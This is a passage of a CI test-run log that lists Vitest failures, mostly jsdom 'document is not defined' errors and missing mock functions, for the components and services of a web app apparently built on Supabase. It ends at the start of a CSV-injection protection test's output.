2025-11-18T17:35:53.5450302Z [31m     → document is not defined[39m
2025-11-18T17:35:53.5451076Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:53.5452451Z [31m   [33m❯[31m __tests__/components/feedback/FeedbackDetail.test.tsx[2m > [22mFeedbackDetail[2m > [22mcan add comments[39m
2025-11-18T17:35:53.5454027Z [31m     → Cannot read properties of undefined (reading 'Symbol(Node prepared with document state workarounds)')[39m
2025-11-18T17:35:53.5455163Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:53.5456742Z [31m   [33m❯[31m __tests__/components/feedback/FeedbackDetail.test.tsx[2m > [22mFeedbackDetail[2m > [22mcloses modal when close button is clicked[39m
2025-11-18T17:35:53.5458693Z [31m     → Cannot read properties of undefined (reading 'Symbol(Node prepared with document state workarounds)')[39m
2025-11-18T17:35:53.5459854Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:53.5461503Z [31m   [33m❯[31m __tests__/components/feedback/FeedbackDetail.test.tsx[2m > [22mFeedbackDetail[2m > [22mcloses modal when overlay is clicked[39m
2025-11-18T17:35:53.5463186Z [31m     → Cannot read properties of undefined (reading 'Symbol(Node prepared with document state workarounds)')[39m
2025-11-18T17:35:53.5464338Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:53.5466075Z [31m   [33m❯[31m __tests__/components/feedback/FeedbackDetail.test.tsx[2m > [22mFeedbackDetail[2m > [22mopens full screenshot modal when screenshot is clicked[39m
2025-11-18T17:35:53.5468043Z [31m     → Cannot read properties of undefined (reading 'Symbol(Node prepared with document state workarounds)')[39m
2025-11-18T17:35:53.5469188Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:53.5470629Z [31m   [33m❯[31m __tests__/components/feedback/FeedbackDetail.test.tsx[2m > [22mFeedbackDetail[2m > [22mformats dates correctly[39m
2025-11-18T17:35:53.5471900Z [31m     → document is not defined[39m
2025-11-18T17:35:53.5472704Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:53.5474158Z [31m   [33m❯[31m __tests__/components/feedback/FeedbackDetail.test.tsx[2m > [22mFeedbackDetail[2m > [22mshows reference number[39m
2025-11-18T17:35:53.5475213Z [31m     → document is not defined[39m
2025-11-18T17:35:53.5476016Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:53.9747742Z  [33m❯[39m tests/workspace/discussionLinkUI.test.tsx [2m ([22m[2m13 tests[22m [2m|[22m [31m13 failed[39m[2m)[22m[90m 20[2mms[22m[39m
2025-11-18T17:35:53.9752270Z [31m   [33m❯[31m tests/workspace/discussionLinkUI.test.tsx[2m > [22mDiscussion Link UI Tests[2m > [22mVisual Display[2m > [22mshould display comment count with proper styling when comments exist[39m
2025-11-18T17:35:53.9753665Z [31m     → document is not defined[39m
2025-11-18T17:35:53.9754214Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:53.9755281Z [31m   [33m❯[31m tests/workspace/discussionLinkUI.test.tsx[2m > [22mDiscussion Link UI Tests[2m > [22mVisual Display[2m > [22mshould display zero comments with gray styling[39m
2025-11-18T17:35:53.9756012Z [31m     → document is not defined[39m
2025-11-18T17:35:53.9757103Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:53.9758159Z [31m   [33m❯[31m tests/workspace/discussionLinkUI.test.tsx[2m > [22mDiscussion Link UI Tests[2m > [22mVisual Display[2m > [22mshould use singular form for 1 comment[39m
2025-11-18T17:35:53.9758894Z [31m     → document is not defined[39m
2025-11-18T17:35:53.9759366Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:53.9760293Z [31m   [33m❯[31m tests/workspace/discussionLinkUI.test.tsx[2m > [22mDiscussion Link UI Tests[2m > [22mVisual Display[2m > [22mshould show chat icon[39m
2025-11-18T17:35:53.9760963Z [31m     → document is not defined[39m
2025-11-18T17:35:53.9761458Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:53.9762583Z [31m   [33m❯[31m tests/workspace/discussionLinkUI.test.tsx[2m > [22mDiscussion Link UI Tests[2m > [22mClick Interactions[2m > [22mshould call onDiscussionClick when discussion link is clicked[39m
2025-11-18T17:35:53.9763941Z [31m     → Cannot read properties of undefined (reading 'Symbol(Node prepared with document state workarounds)')[39m
2025-11-18T17:35:53.9765239Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:53.9767749Z [31m   [33m❯[31m tests/workspace/discussionLinkUI.test.tsx[2m > [22mDiscussion Link UI Tests[2m > [22mClick Interactions[2m > [22mshould not trigger assignment click when discussion link is clicked[39m
2025-11-18T17:35:53.9769345Z [31m     → document is not defined[39m
2025-11-18T17:35:53.9770217Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:53.9772266Z [31m   [33m❯[31m tests/workspace/discussionLinkUI.test.tsx[2m > [22mDiscussion Link UI Tests[2m > [22mClick Interactions[2m > [22mshould trigger assignment click when card is clicked outside discussion link[39m
2025-11-18T17:35:53.9774195Z [31m     → Cannot read properties of undefined (reading 'Symbol(Node prepared with document state workarounds)')[39m
2025-11-18T17:35:53.9775431Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:53.9777417Z [31m   [33m❯[31m tests/workspace/discussionLinkUI.test.tsx[2m > [22mDiscussion Link UI Tests[2m > [22mHover Effects[2m > [22mshould apply hover styles to discussion link[39m
2025-11-18T17:35:53.9779336Z [31m     → Cannot read properties of undefined (reading 'Symbol(Node prepared with document state workarounds)')[39m
2025-11-18T17:35:53.9780526Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:53.9782623Z [31m   [33m❯[31m tests/workspace/discussionLinkUI.test.tsx[2m > [22mDiscussion Link UI Tests[2m > [22mAccessibility[2m > [22mshould have proper button role for discussion link[39m
2025-11-18T17:35:53.9783911Z [31m     → document is not defined[39m
2025-11-18T17:35:53.9784713Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:53.9786382Z [31m   [33m❯[31m tests/workspace/discussionLinkUI.test.tsx[2m > [22mDiscussion Link UI Tests[2m > [22mAccessibility[2m > [22mshould be keyboard navigable[39m
2025-11-18T17:35:53.9788342Z [31m     → Cannot read properties of undefined (reading 'Symbol(Node prepared with document state workarounds)')[39m
2025-11-18T17:35:53.9789514Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:53.9791327Z [31m   [33m❯[31m tests/workspace/discussionLinkUI.test.tsx[2m > [22mDiscussion Link UI Tests[2m > [22mDynamic Updates[2m > [22mshould update comment count when prop changes[39m
2025-11-18T17:35:53.9792622Z [31m     → document is not defined[39m
2025-11-18T17:35:53.9793440Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:53.9795345Z [31m   [33m❯[31m tests/workspace/discussionLinkUI.test.tsx[2m > [22mDiscussion Link UI Tests[2m > [22mEdge Cases[2m > [22mshould handle very large comment counts[39m
2025-11-18T17:35:53.9796595Z [31m     → document is not defined[39m
2025-11-18T17:35:53.9797684Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:53.9799512Z [31m   [33m❯[31m tests/workspace/discussionLinkUI.test.tsx[2m > [22mDiscussion Link UI Tests[2m > [22mEdge Cases[2m > [22mshould handle negative comment counts as zero[39m
2025-11-18T17:35:53.9800770Z [31m     → document is not defined[39m
2025-11-18T17:35:53.9801574Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:54.4388290Z [90mstderr[2m | unknown test[22m[39m
2025-11-18T17:35:54.4390697Z ⚠️  Node.js 18 and below are deprecated and will no longer be supported in future versions of @supabase/supabase-js. Please upgrade to Node.js 20 or later. For more information, visit: https://github.com/orgs/supabase/discussions/37217
2025-11-18T17:35:54.4392052Z 
2025-11-18T17:35:54.4733880Z  [33m❯[39m __tests__/api/learning-paths/search-assignees.service-role.spec.ts [2m ([22m[2m9 tests[22m [2m|[22m [31m9 failed[39m[2m)[22m[90m 11[2mms[22m[39m
2025-11-18T17:35:54.4736716Z [31m   [33m❯[31m __tests__/api/learning-paths/search-assignees.service-role.spec.ts[2m > [22m/api/learning-paths/search-assignees[2m > [22mAuthentication and Authorization[2m > [22mshould return 401 when user is not authenticated[39m
2025-11-18T17:35:54.4738205Z [31m     → getApiUser.mockResolvedValue is not a function[39m
2025-11-18T17:35:54.4739545Z [31m   [33m❯[31m __tests__/api/learning-paths/search-assignees.service-role.spec.ts[2m > [22m/api/learning-paths/search-assignees[2m > [22mAuthentication and Authorization[2m > [22mshould return 403 when user lacks manage permission[39m
2025-11-18T17:35:54.4740624Z [31m     → getApiUser.mockResolvedValue is not a function[39m
2025-11-18T17:35:54.4741995Z [31m   [33m❯[31m __tests__/api/learning-paths/search-assignees.service-role.spec.ts[2m > [22m/api/learning-paths/search-assignees[2m > [22mService Role Client Usage[2m > [22mshould use service role client for user_roles when schoolId is provided[39m
2025-11-18T17:35:54.4743039Z [31m     → getApiUser.mockResolvedValue is not a function[39m
2025-11-18T17:35:54.4744537Z [31m   [33m❯[31m __tests__/api/learning-paths/search-assignees.service-role.spec.ts[2m > [22m/api/learning-paths/search-assignees[2m > [22mService Role Client Usage[2m > [22mshould use service role client for group member counts[39m
2025-11-18T17:35:54.4746453Z [31m     → getApiUser.mockResolvedValue is not a function[39m
2025-11-18T17:35:54.4749586Z [31m   [33m❯[31m __tests__/api/learning-paths/search-assignees.service-role.spec.ts[2m > [22m/api/learning-paths/search-assignees[2m > [22mResponse Shape and Pagination[2m > [22mshould return correct response shape with pagination info[39m
2025-11-18T17:35:54.4751344Z [31m     → getApiUser.mockResolvedValue is not a function[39m
2025-11-18T17:35:54.4753390Z [31m   [33m❯[31m __tests__/api/learning-paths/search-assignees.service-role.spec.ts[2m > [22m/api/learning-paths/search-assignees[2m > [22mResponse Shape and Pagination[2m > [22mshould handle empty results correctly[39m
2025-11-18T17:35:54.4755008Z [31m     → getApiUser.mockResolvedValue is not a function[39m
2025-11-18T17:35:54.4757374Z [31m   [33m❯[31m __tests__/api/learning-paths/search-assignees.service-role.spec.ts[2m > [22m/api/learning-paths/search-assignees[2m > [22mInput Validation[2m > [22mshould return 400 for missing required fields[39m
2025-11-18T17:35:54.4759026Z [31m     → getApiUser.mockResolvedValue is not a function[39m
2025-11-18T17:35:54.4761056Z [31m   [33m❯[31m __tests__/api/learning-paths/search-assignees.service-role.spec.ts[2m > [22m/api/learning-paths/search-assignees[2m > [22mInput Validation[2m > [22mshould return 400 for invalid searchType[39m
2025-11-18T17:35:54.4762712Z [31m     → getApiUser.mockResolvedValue is not a function[39m
2025-11-18T17:35:54.4764971Z [31m   [33m❯[31m __tests__/api/learning-paths/search-assignees.service-role.spec.ts[2m > [22m/api/learning-paths/search-assignees[2m > [22mInput Validation[2m > [22mshould return 405 for non-POST methods[39m
2025-11-18T17:35:54.4766615Z [31m     → getApiUser.mockResolvedValue is not a function[39m
2025-11-18T17:35:54.9520853Z [90mstderr[2m | unknown test[22m[39m
2025-11-18T17:35:54.9521947Z  [33m❯[39m __tests__/pages/api/admin/reset-password.test.ts [2m ([22m[2m0 test[22m[2m)[22m
2025-11-18T17:35:54.9524930Z ⚠️  Node.js 18 and below are deprecated and will no longer be supported in future versions of @supabase/supabase-js. Please upgrade to Node.js 20 or later. For more information, visit: https://github.com/orgs/supabase/discussions/37217
2025-11-18T17:35:54.9526681Z 
2025-11-18T17:35:55.4539076Z  [33m❯[39m components/__tests__/PasswordResetModal.test.tsx [2m ([22m[2m13 tests[22m [2m|[22m [31m13 failed[39m[2m)[22m[90m 16[2mms[22m[39m
2025-11-18T17:35:55.4542595Z [31m   [33m❯[31m components/__tests__/PasswordResetModal.test.tsx[2m > [22mPasswordResetModal[2m > [22mshould not render when isOpen is false[39m
2025-11-18T17:35:55.4587630Z [31m     → document is not defined[39m
2025-11-18T17:35:55.4589692Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:55.4593070Z [31m   [33m❯[31m components/__tests__/PasswordResetModal.test.tsx[2m > [22mPasswordResetModal[2m > [22mshould not render when user is null[39m
2025-11-18T17:35:55.4597305Z [31m     → document is not defined[39m
2025-11-18T17:35:55.4598166Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:55.4599300Z [31m   [33m❯[31m components/__tests__/PasswordResetModal.test.tsx[2m > [22mPasswordResetModal[2m > [22mshould render correctly when open with user[39m
2025-11-18T17:35:55.4600015Z [31m     → document is not defined[39m
2025-11-18T17:35:55.4600498Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:55.4601465Z [31m   [33m❯[31m components/__tests__/PasswordResetModal.test.tsx[2m > [22mPasswordResetModal[2m > [22mshould show error when submitting empty password[39m
2025-11-18T17:35:55.4602483Z [31m     → Cannot read properties of undefined (reading 'Symbol(Node prepared with document state workarounds)')[39m
2025-11-18T17:35:55.4603176Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:55.4604106Z [31m   [33m❯[31m components/__tests__/PasswordResetModal.test.tsx[2m > [22mPasswordResetModal[2m > [22mshould show error when passwords do not match[39m
2025-11-18T17:35:55.4605470Z [31m     → Cannot read properties of undefined (reading 'Symbol(Node prepared with document state workarounds)')[39m
2025-11-18T17:35:55.4606140Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:55.4607726Z [31m   [33m❯[31m components/__tests__/PasswordResetModal.test.tsx[2m > [22mPasswordResetModal[2m > [22mshould show error for password less than 6 characters[39m
2025-11-18T17:35:55.4609755Z [31m     → Cannot read properties of undefined (reading 'Symbol(Node prepared with document state workarounds)')[39m
2025-11-18T17:35:55.4611096Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:55.4612948Z [31m   [33m❯[31m components/__tests__/PasswordResetModal.test.tsx[2m > [22mPasswordResetModal[2m > [22mshould generate random password when button is clicked[39m
2025-11-18T17:35:55.4614760Z [31m     → Cannot read properties of undefined (reading 'Symbol(Node prepared with document state workarounds)')[39m
2025-11-18T17:35:55.4615917Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:55.4617638Z [31m   [33m❯[31m components/__tests__/PasswordResetModal.test.tsx[2m > [22mPasswordResetModal[2m > [22mshould toggle password visibility[39m
2025-11-18T17:35:55.4619493Z [31m     → Cannot read properties of undefined (reading 'Symbol(Node prepared with document state workarounds)')[39m
2025-11-18T17:35:55.4620658Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:55.4622360Z [31m   [33m❯[31m components/__tests__/PasswordResetModal.test.tsx[2m > [22mPasswordResetModal[2m > [22mshould successfully reset password with valid inputs[39m
2025-11-18T17:35:55.4624116Z [31m     → Cannot read properties of undefined (reading 'Symbol(Node prepared with document state workarounds)')[39m
2025-11-18T17:35:55.4625283Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:55.4627158Z [31m   [33m❯[31m components/__tests__/PasswordResetModal.test.tsx[2m > [22mPasswordResetModal[2m > [22mshould show error when password reset fails[39m
2025-11-18T17:35:55.4628975Z [31m     → Cannot read properties of undefined (reading 'Symbol(Node prepared with document state workarounds)')[39m
2025-11-18T17:35:55.4630181Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:55.4631757Z [31m   [33m❯[31m components/__tests__/PasswordResetModal.test.tsx[2m > [22mPasswordResetModal[2m > [22mshould disable buttons while resetting[39m
2025-11-18T17:35:55.4633458Z [31m     → Cannot read properties of undefined (reading 'Symbol(Node prepared with document state workarounds)')[39m
2025-11-18T17:35:55.4634600Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:55.4636227Z [31m   [33m❯[31m components/__tests__/PasswordResetModal.test.tsx[2m > [22mPasswordResetModal[2m > [22mshould close modal when cancel button is clicked[39m
2025-11-18T17:35:55.4638168Z [31m     → Cannot read properties of undefined (reading 'Symbol(Node prepared with document state workarounds)')[39m
2025-11-18T17:35:55.4639318Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:55.4640913Z [31m   [33m❯[31m components/__tests__/PasswordResetModal.test.tsx[2m > [22mPasswordResetModal[2m > [22mshould close modal when X button is clicked[39m
2025-11-18T17:35:55.4642622Z [31m     → Cannot read properties of undefined (reading 'Symbol(Node prepared with document state workarounds)')[39m
2025-11-18T17:35:55.4643766Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:55.8761797Z  [33m❯[39m __tests__/services/quizSubmissions.test.js [2m ([22m[2m0 test[22m[2m)[22m
2025-11-18T17:35:55.8810744Z [90mstderr[2m | unknown test[22m[39m
2025-11-18T17:35:55.8813256Z ⚠️  Node.js 18 and below are deprecated and will no longer be supported in future versions of @supabase/supabase-js. Please upgrade to Node.js 20 or later. For more information, visit: https://github.com/orgs/supabase/discussions/37217
2025-11-18T17:35:55.8814943Z 
2025-11-18T17:35:56.6142730Z  [33m❯[39m e2e/tests/reports-analytics-simple.spec.ts [2m ([22m[2m0 test[22m[2m)[22m
2025-11-18T17:35:57.3585631Z  [33m❯[39m e2e/tests/admin-learning-paths-school-filter.spec.ts [2m ([22m[2m0 test[22m[2m)[22m
2025-11-18T17:35:58.1055508Z  [33m❯[39m e2e/tests/auth.spec.ts [2m ([22m[2m0 test[22m[2m)[22m
2025-11-18T17:35:58.5971790Z  [33m❯[39m __tests__/contracts/invoice-deletion-simple.test.tsx [2m ([22m[2m10 tests[22m [2m|[22m [31m10 failed[39m[2m)[22m[90m 14[2mms[22m[39m
2025-11-18T17:35:58.5975822Z [31m   [33m❯[31m __tests__/contracts/invoice-deletion-simple.test.tsx[2m > [22mInvoice Deletion - ContractDetailsModal[2m > [22mrenders delete button for invoices[39m
2025-11-18T17:35:58.5977402Z [31m     → document is not defined[39m
2025-11-18T17:35:58.5978253Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:58.5980483Z [31m   [33m❯[31m __tests__/contracts/invoice-deletion-simple.test.tsx[2m > [22mInvoice Deletion - ContractDetailsModal[2m > [22mshows custom confirmation modal when delete is clicked[39m
2025-11-18T17:35:58.5982842Z [31m     → Cannot read properties of undefined (reading 'Symbol(Node prepared with document state workarounds)')[39m
2025-11-18T17:35:58.5984013Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:58.5985769Z [31m   [33m❯[31m __tests__/contracts/invoice-deletion-simple.test.tsx[2m > [22mInvoice Deletion - ContractDetailsModal[2m > [22mcloses modal when cancel is clicked[39m
2025-11-18T17:35:58.5987901Z [31m     → Cannot read properties of undefined (reading 'Symbol(Node prepared with document state workarounds)')[39m
2025-11-18T17:35:58.5989111Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:58.5990932Z [31m   [33m❯[31m __tests__/contracts/invoice-deletion-simple.test.tsx[2m > [22mInvoice Deletion - ContractDetailsModal[2m > [22mcalls onDeleteInvoice when confirmed[39m
2025-11-18T17:35:58.5992805Z [31m     → Cannot read properties of undefined (reading 'Symbol(Node prepared with document state workarounds)')[39m
2025-11-18T17:35:58.5993962Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:58.5995690Z [31m   [33m❯[31m __tests__/contracts/invoice-deletion-simple.test.tsx[2m > [22mInvoice Deletion - ContractDetailsModal[2m > [22mdisplays enhanced file information[39m
2025-11-18T17:35:58.5997123Z [31m     → document is not defined[39m
2025-11-18T17:35:58.5997965Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:58.5999794Z [31m   [33m❯[31m __tests__/contracts/invoice-deletion-simple.test.tsx[2m > [22mInvoice Deletion - ContractDetailsModal[2m > [22mhides invoice immediately on deletion (optimistic update)[39m
2025-11-18T17:35:58.6001646Z [31m     → Cannot read properties of undefined (reading 'Symbol(Node prepared with document state workarounds)')[39m
2025-11-18T17:35:58.6002791Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:58.6004463Z [31m   [33m❯[31m __tests__/contracts/invoice-deletion-simple.test.tsx[2m > [22mInvoice Deletion - ContractDetailsModal[2m > [22mshows loading state during deletion[39m
2025-11-18T17:35:58.6006271Z [31m     → Cannot read properties of undefined (reading 'Symbol(Node prepared with document state workarounds)')[39m
2025-11-18T17:35:58.6008625Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:58.6010223Z [31m   [33m❯[31m __tests__/contracts/invoice-deletion-simple.test.tsx[2m > [22mInvoice Helper Functions[2m > [22mformatFileSize works correctly[39m
2025-11-18T17:35:58.6011604Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:58.6013475Z [31m   [33m❯[31m __tests__/contracts/invoice-deletion-simple.test.tsx[2m > [22mInvoice Helper Functions[2m > [22mgetFileIcon returns correct icons[39m
2025-11-18T17:35:58.6014852Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:58.6016431Z [31m   [33m❯[31m __tests__/contracts/invoice-deletion-simple.test.tsx[2m > [22mInvoice Helper Functions[2m > [22mURL path extraction works[39m
2025-11-18T17:35:58.6017994Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:58.9848785Z  [33m❯[39m __tests__/contracts/invoice-helpers.test.ts [2m ([22m[2m15 tests[22m [2m|[22m [31m1 failed[39m[2m)[22m[90m 16[2mms[22m[39m
2025-11-18T17:35:58.9850862Z [31m   [33m❯[31m __tests__/contracts/invoice-helpers.test.ts[2m > [22mInvoice Helper Functions[2m > [22mformatFileSize[2m > [22mformats bytes correctly[39m
2025-11-18T17:35:58.9852322Z [31m     → expected '' to be '0 B' // Object.is equality[39m
2025-11-18T17:35:59.3642913Z  [33m❯[39m __tests__/services/notificationService.spec.ts [2m ([22m[2m15 tests[22m [2m|[22m [31m13 failed[39m[2m)[22m[90m 15[2mms[22m[39m
2025-11-18T17:35:59.3648188Z [31m   [33m❯[31m __tests__/services/notificationService.spec.ts[2m > [22mNotificationService Deduplication[2m > [22mgenerateIdempotencyKey[2m > [22mshould generate consistent keys for same inputs[39m
2025-11-18T17:35:59.3649815Z [31m     → default.generateIdempotencyKey is not a function[39m
2025-11-18T17:35:59.3651031Z [31m   [33m❯[31m __tests__/services/notificationService.spec.ts[2m > [22mNotificationService Deduplication[2m > [22mgenerateIdempotencyKey[2m > [22mshould generate different keys for different users[39m
2025-11-18T17:35:59.3651992Z [31m     → default.generateIdempotencyKey is not a function[39m
2025-11-18T17:35:59.3653162Z [31m   [33m❯[31m __tests__/services/notificationService.spec.ts[2m > [22mNotificationService Deduplication[2m > [22mgenerateIdempotencyKey[2m > [22mshould generate different keys for different events[39m
2025-11-18T17:35:59.3654120Z [31m     → default.generateIdempotencyKey is not a function[39m
2025-11-18T17:35:59.3655237Z [31m   [33m❯[31m __tests__/services/notificationService.spec.ts[2m > [22mNotificationService Deduplication[2m > [22mgenerateIdempotencyKey[2m > [22mshould handle different event types correctly[39m
2025-11-18T17:35:59.3656133Z [31m     → default.generateIdempotencyKey is not a function[39m
2025-11-18T17:35:59.3657621Z [31m   [33m❯[31m __tests__/services/notificationService.spec.ts[2m > [22mNotificationService Deduplication[2m > [22mgenerateIdempotencyKey[2m > [22mshould handle unknown event types by hashing event data[39m
2025-11-18T17:35:59.3658576Z [31m     → default.generateIdempotencyKey is not a function[39m
2025-11-18T17:35:59.3659673Z [31m   [33m❯[31m __tests__/services/notificationService.spec.ts[2m > [22mNotificationService Deduplication[2m > [22msimpleHash[2m > [22mshould generate consistent hash for same string[39m
2025-11-18T17:35:59.3661609Z [31m     → default.simpleHash is not a function[39m
2025-11-18T17:35:59.3663680Z [31m   [33m❯[31m __tests__/services/notificationService.spec.ts[2m > [22mNotificationService Deduplication[2m > [22msimpleHash[2m > [22mshould generate different hashes for different strings[39m
2025-11-18T17:35:59.3665607Z [31m     → default.simpleHash is not a function[39m
2025-11-18T17:35:59.3667531Z [31m   [33m❯[31m __tests__/services/notificationService.spec.ts[2m > [22mNotificationService Deduplication[2m > [22msimpleHash[2m > [22mshould return string in base36 format[39m
2025-11-18T17:35:59.3668838Z [31m     → default.simpleHash is not a function[39m
2025-11-18T17:35:59.3670544Z [31m   [33m❯[31m __tests__/services/notificationService.spec.ts[2m > [22mNotificationService Deduplication[2m > [22mhashObject[2m > [22mshould generate consistent hash for same object[39m
2025-11-18T17:35:59.3671930Z [31m     → default.hashObject is not a function[39m
2025-11-18T17:35:59.3673941Z [31m   [33m❯[31m __tests__/services/notificationService.spec.ts[2m > [22mNotificationService Deduplication[2m > [22mhashObject[2m > [22mshould generate same hash for objects with same content but different key order[39m
2025-11-18T17:35:59.3675495Z [31m     → default.hashObject is not a function[39m
2025-11-18T17:35:59.3677765Z [31m   [33m❯[31m __tests__/services/notificationService.spec.ts[2m > [22mNotificationService Deduplication[2m > [22mhashObject[2m > [22mshould generate different hashes for different objects[39m
2025-11-18T17:35:59.3679239Z [31m     → default.hashObject is not a function[39m
2025-11-18T17:35:59.3681293Z [31m   [33m❯[31m __tests__/services/notificationService.spec.ts[2m > [22mNotificationService Event Processing[2m > [22mFeedback notification deduplication[2m > [22mshould prevent duplicate feedback notifications[39m
2025-11-18T17:35:59.3682969Z [31m     → default.generateIdempotencyKey is not a function[39m
2025-11-18T17:35:59.3685163Z [31m   [33m❯[31m __tests__/services/notificationService.spec.ts[2m > [22mNotificationService Event Processing[2m > [22mFeedback notification deduplication[2m > [22mshould allow notifications for different feedback items[39m
2025-11-18T17:35:59.3687058Z [31m     → default.generateIdempotencyKey is not a function[39m
2025-11-18T17:35:59.7406140Z  [32m✓[39m __tests__/lessonEditor.test.tsx [2m ([22m[2m7 tests[22m[2m)[22m[90m 9[2mms[22m[39m
2025-11-18T17:36:00.1194431Z  [33m❯[39m __tests__/api/admin/networks-supervisors.test.ts [2m ([22m[2m0 test[22m[2m)[22m
2025-11-18T17:36:00.5117707Z  [32m✓[39m lib/services/__tests__/groupAssignmentsV2.classmates.test.js [2m ([22m[2m4 tests[22m[2m)[22m[90m 10[2mms[22m[39m
2025-11-18T17:36:00.8918802Z  [32m✓[39m __tests__/lessonNavigationLogic.test.ts [2m ([22m[2m7 tests[22m[2m)[22m[90m 10[2mms[22m[39m
2025-11-18T17:36:01.6955653Z  [33m❯[39m e2e/tests/supervisor-permissions.spec.ts [2m ([22m[2m0 test[22m[2m)[22m
2025-11-18T17:36:01.6962344Z [90mstderr[2m | unknown test[22m[39m
2025-11-18T17:36:01.6965578Z ⚠️  Node.js 18 and below are deprecated and will no longer be supported in future versions of @supabase/supabase-js. Please upgrade to Node.js 20 or later. For more information, visit: https://github.com/orgs/supabase/discussions/37217
2025-11-18T17:36:01.6967043Z 
2025-11-18T17:36:02.0952980Z  [32m✓[39m __tests__/utils/rutValidation.test.ts [2m ([22m[2m26 tests[22m[2m)[22m[90m 14[2mms[22m[39m
2025-11-18T17:36:02.4601750Z  [33m❯[39m __tests__/api/admin/networks-schools.test.ts [2m ([22m[2m0 test[22m[2m)[22m
2025-11-18T17:36:03.0547948Z  [33m❯[39m __tests__/pages/admin/user-management-password-reset.test.tsx [2m ([22m[2m4 tests[22m [2m|[22m [31m4 failed[39m[2m)[22m[90m 11[2mms[22m[39m
2025-11-18T17:36:03.0550562Z [31m   [33m❯[31m __tests__/pages/admin/user-management-password-reset.test.tsx[2m > [22mUser Management - Password Reset Feature[2m > [22mshould show password reset button only for approved users[39m
2025-11-18T17:36:03.0552485Z [31m     → document is not defined[39m
2025-11-18T17:36:03.0553337Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:36:03.0555497Z [31m   [33m❯[31m __tests__/pages/admin/user-management-password-reset.test.tsx[2m > [22mUser Management - Password Reset Feature[2m > [22mshould open password reset modal when reset button is clicked[39m
2025-11-18T17:36:03.0557847Z [31m     → Cannot read properties of undefined (reading 'Symbol(Node prepared with document state workarounds)')[39m
2025-11-18T17:36:03.0559082Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:36:03.0561082Z [31m   [33m❯[31m __tests__/pages/admin/user-management-password-reset.test.tsx[2m > [22mUser Management - Password Reset Feature[2m > [22mshould call onSuccess when reset is successful in modal[39m
2025-11-18T17:36:03.0563032Z [31m     → Cannot read properties of undefined (reading 'Symbol(Node prepared with document state workarounds)')[39m
2025-11-18T17:36:03.0564198Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:36:03.0566334Z [31m   [33m❯[31m __tests__/pages/admin/user-management-password-reset.test.tsx[2m > [22mUser Management - Password Reset Feature[2m > [22mshould not show password reset for non-admin users[39m
2025-11-18T17:36:03.0568018Z [31m     → document is not defined[39m
2025-11-18T17:36:03.0568844Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:36:03.4541227Z [90mstdout[2m | __tests__/utils/csvInjectionCore.test.ts[2m > [22m[2mCSV Injection Protection - Core Functionality[2m > [22m[2mFormula Prevention[2m > [22m[2mshould escape equals sign at start of field[22m[39m
2025-11-18T17:36:03.4542836Z [CSV-PARSER] Column detection: {
2025-11-18T17:36:03.4544042Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ],
2025-11-18T17:36:03.4545213Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ]
